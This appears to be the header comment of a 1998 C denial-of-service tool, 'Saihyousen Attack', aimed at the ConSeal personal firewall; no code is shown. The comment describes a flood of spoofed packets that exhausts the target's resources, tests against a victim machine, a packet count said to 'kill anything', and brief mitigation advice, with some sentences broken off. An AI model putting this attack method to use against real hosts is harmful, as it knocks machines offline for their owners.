/* Saihyousen Attack (*Japanese* Ice Breaker), By Noc-Wage (M.C.S.R)
 * Base code from arnudp.c but HEAVILY modified. Originally written
 * sometime early April 1998, I'm a little fuzzy as to the date.
 *
 * I take no responsibility for the actions of any script kiddies who
 * think that running this against some one is a fun way to pass away
 * their useless lives.  I also in NO WAY claim to be good at
 * programming, so modify it all you want, just leave credit to me
 * and PLEASE send me a copy of your modified code.
 *
 * I chose ice breaker because the night before writing this program
 * I read through all of William Gibson's Neuromancer while cradling
 * an empty bottle of Canadian Club and sick with the flu.
 *
 * HOW IT WORKS:
 * The way this program kills the machine happens in 2 ways
 * #1 If Conseal is set for "learning" mode the flooding packets from
 * all the different IPs and ports will cause the program to continously

 * attempt to write more and more new rules.  This eventually uses up
 * all the resources and results in a freeze and eventually a reboot.
 * #2 If ConSeal is set to log attacks, once again because of the number

 * of packets the system resources are eaten up and the machine dies.
 *
 * I tested dx2/66 running RedHat 4.0 (12 megs of ram)
 * as the attacker and a Pentium 233 (64 megs of ram)
 * as the victim.  Using ConSeal The pentium 233 froze after about 5
 * seconds of attack. (This is on an ethernet, but I had done live testing
 * over ppp connection (33.6/28.8) and it took only  few more seconds.
 * Because the packets are so small a 28.8 dial-up would not get lag at
 * all, 14.4 would get minor after about 20,000 packets.  So send as many
 * as you want, generally 40,000 will kill anything.
 *
 * Shouts: My foolish friend who's addicted to ICQ: Essence
 *    #Snickers especially humble(horizon), colonwq, n`tropy, sheenie, sygma!
 *         Howdy to fellow Miltonians Acid_Red (Mully and Tom)
 *     #hackers, `Lo SUidRoot, iCBM, drsmoke, EPiC, trix, modred, halt
 *         And all the rest!
 *     Don't we all miss TRON?

/* How to protect yourself?
 * Well it's fairly simple, disable learning and logging mode.
 * Signal9 has been made aware of this problem LONG before I decided

 * updated should have no problems.  Those of you out there who used
 * a crack or a key generator are probably the type that sit on IRC
 * warez channels all day. As we all know IRC is a very dangerous
 * place for warez pups so I guess you aren't as protected as you may

 *
 * www.signal9.com you can download and upgrade the exsisting
 * copy that you own.
 * Don't come crying to me if your pirated copy of a rather inexpensive
 * piece of software blows up in your face.
